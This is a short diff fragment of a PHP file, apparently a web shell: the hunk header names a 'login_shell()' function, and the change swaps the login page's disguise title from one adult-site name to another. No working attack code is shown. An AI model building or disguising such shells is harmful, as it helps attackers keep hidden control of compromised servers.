@@ -27,7 +27,7 @@ function login_shell() {
 ?>
 <html>
 <head>
-<title>BRAZZERS || Free Porn Videos</title>
+<title>XVIDEOS</title>
 <style type="text/css">
 html {
     margin: 20px auto;
